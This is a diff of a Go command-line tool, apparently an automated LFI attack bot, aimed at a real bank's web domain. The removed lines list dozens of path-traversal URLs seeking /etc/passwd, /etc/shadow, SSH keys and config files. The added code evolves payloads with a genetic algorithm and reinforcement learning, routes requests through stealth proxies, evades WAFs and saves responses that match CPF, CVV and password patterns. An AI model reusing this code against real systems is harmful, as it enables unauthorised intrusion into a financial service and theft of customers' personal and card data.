@@ -1,287 +1,357 @@
+// 📡 main.go — Red Team Autônomo Avançado (Versão Corrigida)
+// GA + RL + ML Feedback | Multi-Channel Injection | SVG & CSV Export | CLI Cobra
 package main
 
 import (
 	"bufio"
-	"context"
 	"crypto/rand"
 	"encoding/binary"
+	"encoding/csv"
+	"encoding/json"
 	"fmt"
 	"io"
-	mathrand "math/rand"
 	"net/http"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"regexp"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
 
-	"github.com/schollz/progressbar" // Barra de progresso
-	"lfitessla/aibridge"
+	mathrand "math/rand"
+
+	"github.com/spf13/cobra"
+	"github.com/schollz/progressbar/v3"
 	"lfitessla/analyzer"
-	"lfitessla/browserexec"
 	"lfitessla/headers"
-	"lfitessla/http2mux"
+	"lfitessla/injector"
 	"lfitessla/mutador"
 	"lfitessla/proxy"
 	"lfitessla/strategies"
-	"lfitessla/telemetry"
-	"lfitessla/injector"
 )
 
-/// Suporte a múltiplos métodos HTTP por alvo
+// RLState representa um estado para tabela de recompensa
+type RLState struct {
+	Payload string `json:"payload"`
+	WAF     string `json:"waf"`
+	Canal   string `json:"canal"`
+}
+
+// EvolutionStats coleta métricas por geração
+type EvolutionStats struct {
+	Generation   int     `json:"generation"`
+	MaxFitness   int     `json:"max_fitness"`
+	AvgFitness   float64 `json:"avg_fitness"`
+	EntropyDelta float64 `json:"entropy_delta"`
+	BestPayload  string  `json:"best_payload"`
+}
+
+// Alvo representa endpoint alvo de LFI/RFI/etc.
 type Alvo struct {
 	URL    string
 	Method string
+	Body   string // para POSTs
 }
 
-// Lista de alvos vulneráveis, incluindo novos alvos com técnicas de bypass
-var alvosBase = []Alvo{
-	// Endpoints gerais com parâmetros comuns de LFI
-	{"https://app.nubank.com.br/beta/index.php?page=", "GET"},
-	{"https://app.nubank.com.br/beta/index.php?file=", "GET"},
-	{"https://app.nubank.com.br/beta/download.php?file=", "GET"},
-	{"https://app.nubank.com.br/beta/view.php?doc=", "GET"},
-	{"https://app.nubank.com.br/beta/template.php?path=", "GET"},
+var (
+	// CLI flags
+	cfgThreads   int
+	cfgGens      int
+	cfgPopSize   int
+	cfgSaveSVG   bool
+	cfgSaveCSV   bool
+	cfgChannels  []string
+	cfgOutputDir string
+	cfgNoBrowser bool
+	cfgDashboard bool
 
-	// Subdiretórios comuns e uploads
-	{"https://app.nubank.com.br/beta/uploads/file=", "GET"},
-	{"https://app.nubank.com.br/beta/admin/config.php?file=", "GET"},
-	{"https://app.nubank.com.br/beta/assets/data.php?file=", "GET"},
-	{"https://app.nubank.com.br/beta/include/template.php?path=", "GET"},
+	// tabelas de RL
+	rlTable = make(map[RLState]float64)
+	statsAll = struct {
+		sync.Mutex
+		Data map[string][]EvolutionStats
+	}{Data: make(map[string][]EvolutionStats)}
 
-	// Diretórios sensíveis típicos para LFI
-	{"https://app.nubank.com.br/beta/var/www/html/index.php?file=", "GET"},
-	{"https://app.nubank.com.br/beta/etc/passwd?file=", "GET"},
-	{"https://app.nubank.com.br/beta/home/user/config.php?path=", "GET"},
-	{"https://app.nubank.com.br/beta/root/.ssh/id_rsa?file=", "GET"},
+	// regex de detecção de vazamento
+	regexSensivel = []*regexp.Regexp{
+		regexp.MustCompile(`(?i)cpf[:=]\s*\d{3}\.\d{3}\.\d{3}-\d{2}`),
+		regexp.MustCompile(`(?i)cvv[:=]?\s*\d{3}`),
+	}
 
-	// Novos alvos com bypasses (path traversal, null byte, etc.)
-	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd", "GET"},
-	{"https://app.nubank.com.br/beta/painel.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "GET"},
-	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd%00", "GET"},
-	{"https://app.nubank.com.br/beta/index.php?file=../../../../../etc/shadow%00", "GET"},
-	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log", "GET"},
-	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log%00", "GET"},
-	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ", "GET"},
-	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ%00", "GET"},
-	{"https://app.nubank.com.br/beta/dashboard.php?path=....//....//etc/passwd", "GET"},
-	{"https://app.nubank.com.br/beta/dashboard.php?path=..%5C..%5Cetc%5Cpasswd", "GET"},
-	{"https://app.nubank.com.br/beta/admin/config.php?config=../../../etc/passwd", "GET"},
-	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd", "GET"},
-	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd%00", "GET"},
-	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log", "GET"},
-	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log%00", "GET"},
-	{"https://app.nubank.com.br/beta/wp-content/plugins/vulnerable-plugin/include.php?file=../../../../../../wp-config.php", "GET"},
-	{"https://app.nubank.com.br/beta/index.php?option=com_webtv&controller=../../../../../../etc/passwd%00", "GET"},
-	{"https://app.nubank.com.br/beta/index.php?option=com_config&view=../../../../../../configuration.php", "GET"},
-	{"https://app.nubank.com.br/beta/index.php?file=../../../../../home/admin/.ssh/authorized_keys", "GET"},
-	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/issue", "GET"},
-	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/hostname", "GET"},
-	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../var/www/html/index.php", "GET"},
-
-	// Tentativas de outros métodos HTTP
-	{"https://app.nubank.com.br/beta/api/upload.php", "POST"},
-	{"https://app.nubank.com.br/beta/api/delete.php", "DELETE"},
-	{"https://app.nubank.com.br/beta/api/update.php?file=", "PUT"},
-
-	// Outras extensões e arquivos
-	{"https://app.nubank.com.br/beta/index.jsp?file=", "GET"},
-	{"https://app.nubank.com.br/beta/include/config.pl?path=", "GET"},
-	{"https://app.nubank.com.br/beta/admin/config.asp?file=", "GET"},
-}
-
-
-const (
-	payloadsFile = "C:/Users/Paulo/Desktop/lfi-tessla-pro/backend/python/ia_payload_gen/payloads/payloads_gerados.txt"
-	outputDir     = "./vazamentos"
-	threadsAtivas = 20
+	// alvos básicos
+	alvosBase = []Alvo{
+		{"https://app.nubank.com.br/beta/index.php?page=", "GET", ""},
+		{"https://app.nubank.com.br/beta/index.php?file=", "GET", ""},
+		{"https://app.nubank.com.br/beta/download.php?file=", "GET", ""},
+		{"https://app.nubank.com.br/beta/view.php?doc=", "GET", ""},
+		{"https://app.nubank.com.br/beta/template.php?path=", "GET", ""},
+	}
 )
 
-var regexSensivel = []*regexp.Regexp{
-	regexp.MustCompile(`(?i)cpf[:=]\s*\d{3}\.\d{3}\.\d{3}-\d{2}`),
-	regexp.MustCompile(`(?i)cvv[:=]?\s*\d{3}`),
-	regexp.MustCompile(`(?i)aws[_-]?secret`),
-	regexp.MustCompile(`(?i)db[_-]?pass`),
-	regexp.MustCompile(`(?i)eyJ[A-Za-z0-9_-]{10,}`),
-	regexp.MustCompile(`(?i)BEGIN TRANSACTION`),
-	regexp.MustCompile(`(?i)senha[:=]?\s*\w+`),
-	regexp.MustCompile(`(?i)usuario[:=]?\s*\w+`),
+func main() {
+	rootCmd := &cobra.Command{
+		Use:   "redbot",
+		Short: "Red Team Autônomo Avançado",
+		Run:   run,
+	}
+
+	// flags
+	rootCmd.Flags().IntVarP(&cfgThreads, "threads", "t", 20, "concurrent threads")
+	rootCmd.Flags().IntVarP(&cfgGens, "gens", "g", 8, "GA generations")
+	rootCmd.Flags().IntVarP(&cfgPopSize, "pop", "p", 10, "GA population size")
+	rootCmd.Flags().BoolVar(&cfgSaveSVG, "save-svg", false, "save entropy SVG for elites")
+	rootCmd.Flags().BoolVar(&cfgSaveCSV, "save-csv", false, "save CSV stats per attack")
+	rootCmd.Flags().StringSliceVar(&cfgChannels, "channels", []string{"url", "header", "cookie", "json"}, "injection channels: url,header,cookie,json,xml")
+	rootCmd.Flags().StringVarP(&cfgOutputDir, "output", "o", "./output", "output base directory")
+	rootCmd.Flags().BoolVar(&cfgNoBrowser, "no-browser", false, "no automatic dashboard browser launch")
+	rootCmd.Flags().BoolVar(&cfgDashboard, "dashboard", true, "generate dashboard JSON + HTML")
+
+	if err := rootCmd.Execute(); err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
 }
 
-func main() {
-	// ✅ Quantum-inspired PRNG: seed math/rand via crypto/rand
+func run(cmd *cobra.Command, args []string) {
+	// seed math/rand
 	var seed int64
 	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
 	mathrand.Seed(seed)
 
-	// Criação do diretório de vazamentos
-	os.MkdirAll(outputDir, os.ModePerm)
+	// criar pastas
+	os.MkdirAll(filepath.Join(cfgOutputDir, "vazamentos"), 0755)
+	if cfgSaveSVG {
+		os.MkdirAll(filepath.Join(cfgOutputDir, "svg_debug"), 0755)
+	}
+	if cfgSaveCSV {
+		os.MkdirAll(filepath.Join(cfgOutputDir, "stats_csv"), 0755)
+	}
 
-	// Carregar payloads
-	payloads, err := carregarPayloads(payloadsFile)
+	// carregar payloads
+	payloads, err := carregarPayloads("payloads_gerados.txt")
 	if err != nil {
-		fmt.Printf("❌ Erro ao carregar payloads: %v\n", err)
+		fmt.Println("❌ Carregar payloads:", err)
 		return
 	}
 
-	// Barra de progresso
-	pb := progressbar.New(len(alvosBase) * len(payloads))
+	// loop de ataques
+	total := len(alvosBase) * len(payloads)
+	bar := progressbar.NewOptions(total, progressbar.OptionSetPredictTime(false))
+	sem := make(chan struct{}, cfgThreads)
 	var wg sync.WaitGroup
-	sem := make(chan struct{}, threadsAtivas)
 
-	// Execução dos ataques
 	for _, alvo := range alvosBase {
-		for _, payload := range payloads {
-			alvo := alvo
-			payload := payload
-
+		for _, p := range payloads {
 			wg.Add(1)
 			sem <- struct{}{}
-
-			go func(a Alvo, p string) {
+			go func(a Alvo, payload string) {
 				defer wg.Done()
-				executarAtaque(a, p)
+				executarAtaque(a, payload)
 				<-sem
-				pb.Add(1)
-			}(alvo, payload)
+				bar.Add(1)
+			}(alvo, p)
 		}
 	}
-
 	wg.Wait()
-	fmt.Println("✅ Ataques finalizados. Verifique a pasta /vazamentos.")
+	fmt.Println("✅ Ataques finalizados.")
+	exportResults()
+
+	if cfgDashboard && !cfgNoBrowser {
+		openBrowser(filepath.Join(cfgOutputDir, "dashboard.html"))
+	}
 }
 
-// CarregarPayloads carrega os payloads do arquivo de texto
 func carregarPayloads(path string) ([]string, error) {
-	var payloads []string
-	file, err := os.Open(path)
+	f, err := os.Open(path)
 	if err != nil {
 		return nil, err
 	}
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
+	defer f.Close()
+	var list []string
+	scanner := bufio.NewScanner(f)
 	for scanner.Scan() {
-		linha := strings.TrimSpace(scanner.Text())
-		if linha != "" && !strings.HasPrefix(linha, "---") {
-			payloads = append(payloads, linha)
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" && !strings.HasPrefix(line, "---") {
+			list = append(list, line)
 		}
 	}
-	return payloads, nil
+	return list, scanner.Err()
 }
 
-// ExecutarAtaque realiza o ataque LFI
-func executarAtaque(alvo Alvo, payload string) {
-	// Realiza mutação do payload
-	for _, mutado := range mutador.MutarPayload(payload) {
-		urlFinal := alvo.URL + mutado
+func executarAtaque(alvo Alvo, basePayload string) {
+	attackID := fmt.Sprintf("%s|%s", alvo.URL, basePayload)
 
-		// Monta requisição
-		req, err := http.NewRequest(alvo.Method, urlFinal, nil)
-		if err != nil {
-			fmt.Printf("❌ Erro na requisição %s: %v\n", urlFinal, err)
-			continue
-		}
+	// 1) Inicial com entropia-target
+	initPop := mutador.MutarParaEntropiaTarget(basePayload, 6.5)
+	if len(initPop) == 0 {
+		initPop = mutador.MutarPayload(basePayload)
+	}
 
-		// Headers realistas
-		h := headers.GerarHeadersRealistas()
-		for k, v := range h {
-			req.Header[k] = v
-		}
+	// 2) GA loop
+	finalPop, stats := runGAWithStats(initPop, cfgGens, cfgPopSize)
 
-		// Proxy furtivo com roteamento adaptativo (uTLS ou HTTP/2)
-		proxySel, client, err := stealthrouter.EscolherTransport("", "")
-		if err != nil {
-			fmt.Printf("❌ Erro ao criar cliente furtivo: %v\n", err)
-			continue
-		}
+	// Armazenar stats
+	statsAll.Lock()
+	statsAll.Data[attackID] = stats
+	statsAll.Unlock()
 
-		// Cross-vantage: proxy secundário pra evasão comparativa
-		go func(originalReq *http.Request) {
-			proxySec := proxy.SelecionarOutroProxy(proxySel)
-			if client2, e2 := http2mux.ClientHTTP2ComProxy(proxySec.Address); e2 == nil {
-				if resp2, e3 := client2.Do(originalReq.Clone(context.TODO())); e3 == nil {
-					diff := analyzer.CompararRespostas(nil, resp2)
-					if diff {
-						fmt.Println("🔁 Diferença entre vantage points → evasão detectável")
-					}
-					resp2.Body.Close()
-				}
+	// opcional CSV
+	if cfgSaveCSV {
+		saveCSVStats(attackID, stats)
+	}
+
+	// 3) Multi-Channel Injection
+	for _, elite := range finalPop {
+		for _, canal := range cfgChannels {
+			mutantes := mutador.MutarPorCanal(elite.Payload, canal)
+			if len(mutantes) == 0 {
+				mutantes = []string{elite.Payload}
 			}
-		}(req)
-
-		// Executa requisição principal
-		start := time.Now()
-		resp, err := client.Do(req)
-		duration := time.Since(start).Milliseconds()
-		if err != nil {
-			fmt.Printf("⚠️ Erro em %s: %v\n", urlFinal, err)
-			proxy.MarcarFalha(proxySel)
-			continue
-		}
-
-		bodyBytes, err := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		if err != nil {
-			fmt.Printf("❌ Erro lendo corpo: %v\n", err)
-			continue
-		}
-		body := string(bodyBytes)
-
-		// Análise de status HTTP
-		if resp.StatusCode >= 500 {
-			fmt.Printf("⚠️ HTTP %d (erro server) → %s\n", resp.StatusCode, urlFinal)
-			proxy.MarcarFalha(proxySel)
-			continue
-		} else if resp.StatusCode == 403 {
-			fmt.Println("🚧 Bloqueio WAF (403). Tentando fallback...")
-			fallbackResp := injector.TentarFallback(alvo.URL, mutado)
-			if fallbackResp.Success {
-				fmt.Printf("✅ Fallback ativo → via %s\n", fallbackResp.Canal)
-				salvarResposta(mutado, alvo.URL, fallbackResp.Body)
-				continue
-			}
-		}
-
-		// Detecta WAF
-		waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
-		if waf != "" {
-			fmt.Printf("🛡️ %s → %s\n", waf, urlFinal)
-			if strings.Contains(strings.ToLower(waf), "cloudflare") {
-				fmt.Println("👁️ Cloudflare detectado → stealth browser...")
-				if brresp, err := browserexec.ExecutarNoBrowser(urlFinal, mutado); err == nil && brresp.Success && respostaContemVazamento(brresp.Body) {
-					salvarResposta(mutado, alvo.URL, brresp.Body)
+			for _, m := range mutantes {
+				req, err := strategies.BuildInjectionRequest(canal, alvo.Method, alvo.URL, m, alvo.Body)
+				if err != nil {
 					continue
 				}
+				for k, v := range headers.GerarHeadersRealistas() {
+					req.Header[k] = v
+				}
+				proxySel, client, err := strategies.EscolherTransport("", "")
+				if err != nil {
+					continue
+				}
+				start := time.Now()
+				resp, err2 := client.Do(req)
+				latency := time.Since(start).Seconds()
+				if err2 != nil {
+					proxy.MarcarFalha(proxySel)
+					continue
+				}
+				bodyBytes, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				body := string(bodyBytes)
+
+				waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
+				key := RLState{Payload: m, WAF: waf, Canal: canal}
+				rlTable[key] += 0.1
+
+				if resp.StatusCode == http.StatusForbidden {
+					fb := injector.TentarFallback(alvo.URL, m)
+					if fb.Success {
+						salvarResposta(m, alvo.URL, fb.Body)
+						rlTable[key] += fb.Reward
+						return
+					}
+				}
+
+				if containsLeak(body) {
+					salvarResposta(m, alvo.URL, body)
+					reward := analyzer.ScoreResponse(body) - latency*0.1
+					rlTable[key] += reward
+					if cfgSaveSVG {
+						svg := mutador.EntropyVisualDebug(mutador.GenePayload{Payload: m})
+						safe := safeFilename(m)
+						os.WriteFile(filepath.Join(cfgOutputDir, "svg_debug", safe+".svg"), []byte(svg), 0644)
+					}
+					return
+				}
 			}
 		}
+	}
 
-		// Vazamento?
-		if respostaContemVazamento(body) {
-			salvarResposta(mutado, alvo.URL, body)
-			fmt.Printf("💥 VAZAMENTO: %s\n", urlFinal)
+	// 4) Fallback mutações simples
+	for _, m := range mutador.MutarPayload(basePayload) {
+		req, _ := http.NewRequest(alvo.Method, alvo.URL+m, strings.NewReader(alvo.Body))
+		for k, v := range headers.GerarHeadersRealistas() {
+			req.Header[k] = v
 		}
-
-		// Telemetria
-		snippet := body
-		if len(body) > 200 {
-			snippet = body[:200]
+		proxySel, client, err := strategies.EscolherTransport("", "")
+		if err != nil {
+			continue
 		}
-		classif := analyzer.ClassificarVazamento(body)
-		telemetry.EnviarTelemetry(telemetry.TelemetryData{
-			Payload:    mutado,
-			StatusCode: resp.StatusCode,
-			LatencyMs:  duration,
-			WAF:        classif,
-			Snippet:    snippet,
-		})
-
-		// Reforço IA
-		aibridge.EnviarFeedbackReforco(mutado, resp.StatusCode, duration, waf)
+		resp, err2 := client.Do(req)
+		if err2 != nil {
+			proxy.MarcarFalha(proxySel)
+			continue
+		}
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		body := string(bodyBytes)
+		if containsLeak(body) {
+			salvarResposta(m, alvo.URL, body)
+			key := RLState{Payload: m, WAF: "", Canal: "fallback"}
+			rlTable[key] += 0.5
+			return
+		}
 	}
 }
 
-// RespostaContemVazamento verifica se a resposta contém dados sensíveis
-func respostaContemVazamento(body string) bool {
+func runGAWithStats(initial []string, generations, popSize int) ([]mutador.GenePayload, []EvolutionStats) {
+	pop := make([]mutador.GenePayload, len(initial))
+	for i, p := range initial {
+		pop[i] = mutador.GenePayload{Payload: p}
+		pop[i].Fitness = mutador.AvaliarFitness(pop[i])
+		pop[i].Profile = mutador.AnalyzeProfile(pop[i])
+		pop[i].Mutations = []string{"init"}
+	}
+
+	var stats []EvolutionStats
+	prevEnt := 0.0
+
+	for gen := 0; gen < generations; gen++ {
+		var offs []mutador.GenePayload
+		for i := 0; i < popSize; i++ {
+			a := pop[mathrand.Intn(len(pop))]
+			b := pop[mathrand.Intn(len(pop))]
+			child := mutador.Crossover(a, b)
+			child.Mutations = append(child.Mutations, "crossover")
+			if mathrand.Float64() < 0.5 {
+				child = mutador.MutateGene(child)
+				child.Mutations = append(child.Mutations, "mutate-gene")
+			} else {
+				child = mutador.MutateInMaxEntropyWindow(child, 16)
+				child.Mutations = append(child.Mutations, "mutate-window")
+			}
+			if mathrand.Float64() < 0.3 {
+				child = mutador.MutarEncodeEntropyAware(child)
+				child.Mutations = append(child.Mutations, "encode-entropy")
+			}
+			child.Fitness = mutador.AvaliarFitness(child)
+			child.Profile = mutador.AnalyzeProfile(child)
+			offs = append(offs, child)
+		}
+		pop = append(pop, offs...)
+		pop = mutador.BatchAnalyzeFitness(pop)
+		pop = mutador.SelecionarPayloads(pop, popSize)
+
+		// estatísticas
+		maxF, sumF, sumE := pop[0].Fitness, 0, 0.0
+		for _, ind := range pop {
+			sumF += ind.Fitness
+			sumE += ind.Profile.Entropy
+			if ind.Fitness > maxF {
+				maxF = ind.Fitness
+			}
+		}
+		avgF := float64(sumF) / float64(len(pop))
+		avgE := sumE / float64(len(pop))
+		delta := avgE - prevEnt
+		prevEnt = avgE
+
+		stats = append(stats, EvolutionStats{
+			Generation:   gen,
+			MaxFitness:   maxF,
+			AvgFitness:   avgF,
+			EntropyDelta: delta,
+			BestPayload:  pop[0].Payload,
+		})
+	}
+
+	return pop, stats
+}
+
+func containsLeak(body string) bool {
 	for _, re := range regexSensivel {
 		if re.MatchString(body) {
 			return true
@@ -290,13 +360,97 @@ func respostaContemVazamento(body string) bool {
 	return false
 }
 
-// SalvarResposta salva a resposta de um vazamento em arquivo
 func salvarResposta(payload, base, body string) {
-	timestamp := time.Now().Format("2006-01-02_15-04-05")
-	safePayload := strings.ReplaceAll(payload, "/", "_")
-	basePart := strings.Split(base, "?")[1]
-	filename := fmt.Sprintf("%s/vazamento_%s__%s__%s.txt", outputDir, basePart, safePayload, timestamp)
-	if err := os.WriteFile(filename, []byte(body), 0644); err != nil {
-		fmt.Printf("❌ Erro ao salvar resposta: %v\n", err)
+	ts := time.Now().Format("2006-01-02_15-04-05")
+	safe := safeFilename(payload)
+	parts := strings.SplitN(base, "?", 2)
+	name := "root"
+	if len(parts) == 2 {
+		name = parts[1]
 	}
+	fn := filepath.Join(cfgOutputDir, "vazamentos",
+		fmt.Sprintf("resp_%s__%s__%s.txt", name, safe, ts))
+	os.WriteFile(fn, []byte(body), 0644)
+}
+
+func safeFilename(s string) string {
+	return strings.NewReplacer(
+		"/", "_", "%", "_", "?", "_", "&", "_", "=", "_",
+	).Replace(s)
+}
+
+func saveCSVStats(attackID string, stats []EvolutionStats) {
+	file := filepath.Join(cfgOutputDir, "stats_csv", safeFilename(attackID)+".csv")
+	f, err := os.Create(file)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	w := csv.NewWriter(f)
+	w.Write([]string{"gen", "max_fitness", "avg_fitness", "entropy_delta", "best_payload"})
+	for _, s := range stats {
+		w.Write([]string{
+			fmt.Sprint(s.Generation),
+			fmt.Sprint(s.MaxFitness),
+			fmt.Sprintf("%.2f", s.AvgFitness),
+			fmt.Sprintf("%.4f", s.EntropyDelta),
+			s.BestPayload,
+		})
+	}
+	w.Flush()
+}
+
+func exportResults() {
+	// RL rewards
+	if data, err := json.MarshalIndent(rlTable, "", "  "); err == nil {
+		os.WriteFile(filepath.Join(cfgOutputDir, "rl_rewards.json"), data, 0644)
+	}
+	// Evolution stats
+	statsAll.Lock()
+	if data, err := json.MarshalIndent(statsAll.Data, "", "  "); err == nil {
+		os.WriteFile(filepath.Join(cfgOutputDir, "evolution_stats.json"), data, 0644)
+	}
+	statsAll.Unlock()
+
+	// Dashboard básico (HTML + Chart.js)
+	if cfgDashboard {
+		generateDashboard(cfgOutputDir)
+	}
+}
+
+func generateDashboard(outDir string) {
+	html := `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Dashboard RedBot</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+  <h1>Evolution Stats</h1>
+  <canvas id="evoChart" width="800" height="400"></canvas>
+  <script>
+    fetch('evolution_stats.json').then(r=>r.json()).then(data=>{
+      console.log(data);
+      // aqui você pode popular o Chart.js
+    });
+  </script>
+</body>
+</html>`
+	os.WriteFile(filepath.Join(outDir, "dashboard.html"), []byte(html), 0644)
+}
+
+// openBrowser tenta abrir o arquivo HTML no navegador padrão
+func openBrowser(path string) {
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd", "/c", "start", path)
+	case "darwin":
+		cmd = exec.Command("open", path)
+	default:
+		cmd = exec.Command("xdg-open", path)
+	}
+	_ = cmd.Start()
 }
